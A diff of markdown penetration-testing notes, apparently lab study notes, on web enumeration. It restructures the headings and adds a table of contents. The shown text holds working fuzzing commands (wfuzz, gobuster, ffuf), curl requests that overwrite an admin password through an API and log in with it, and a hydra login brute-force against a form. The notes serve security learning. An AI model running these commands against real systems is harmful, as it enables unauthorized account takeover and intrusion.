@@ -1,4 +1,17 @@
-# Fingerprinting Web Servers
+- [[#Virtual Hosting|Virtual Hosting]]
+- [[#Directory Brute Force|Directory Brute Force]]
+	- [[#Directory Brute Force#With no trailing slash|With no trailing slash]]
+	- [[#Directory Brute Force#With trailing slash|With trailing slash]]
+	- [[#Directory Brute Force#Post Fuzzing|Post Fuzzing]]
+- [[#Files Brute Force|Files Brute Force]]
+	- [[#Files Brute Force#Interesting files|Interesting files]]
+- [[#[[35 LFI|Directory Traversal & LFI]]|[[35 LFI|Directory Traversal & LFI]]]]
+- [[#Enumerating and Abusing APIs|Enumerating and Abusing APIs]]
+		- [[#Interesting files#Example|Example]]
+- [[#Exploitation|Exploitation]]
+- [[#Login BruteForce|Login BruteForce]]
+
+## Fingerprinting Web Servers
 
 - Web server version
 - Web technology version
@@ -6,7 +19,7 @@
 - Default Credentials!
 - Html source code
 - robots.txt
-# Virtual Hosting
+## Virtual Hosting
 
 ```bash
 wfuzz -t 100 -H 'Host: FUZZ.contoso.com' -w /opt/SecLists/Discovery/DNS/combined_subdomains.txt --hh=? http://contoso.com
@@ -19,7 +32,7 @@ gobuster dns -t 100 -w /opt/SecLists/Discovery/DNS/combined_subdomains.txt -d co
 ```bash
 ffuf -t 10 -w /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -u http://contoso.com -H 'Host: FUZZ.contoso.com'
 ```
-# Directory Brute Force
+## Directory Brute Force
 
 We can use the max entries "combined_directories.txt"
 Or we can adjust the entries based on the OS, CMS, etc.
@@ -42,7 +55,7 @@ gobuster dir -t 100 -w /opt/SecLists/Discovery/Web-Content/combined_directories.
 wfuzz -t 100 -w /opt/SecLists/Discovery/Web-Content/combined_directories.txt  http://contoso.com/FUZZ -o fuzz-directory-root-post.txt
 ```
 
-# Files Brute Force
+## Files Brute Force
 
 We can use the max entries "combined_words.txt"
 Or we can adjust the entries based on the OS, CMS, etc.
@@ -67,7 +80,7 @@ config
 ```
 ## [[35 LFI|Directory Traversal & LFI]]
 
-# Enumerating and Abusing APIs
+## Enumerating and Abusing APIs
 
 Apis can listen to POST requests as GET requests
 
@@ -94,7 +107,7 @@ curl -X 'PUT' \
   -d '{"password": "pwned"}'
 curl -d '{"password":"pwned","username":"admin"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/login
 ```
-# Exploitation
+## Exploitation
 
 Based in all these findings we can search exploits by:
 1. OS
@@ -107,5 +120,3 @@ Based in all these findings we can search exploits by:
 ```bash
 hydra -l user -P /usr/share/wordlists/rockyou.txt <192.168.50.201> http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"
 ```
-
-### API
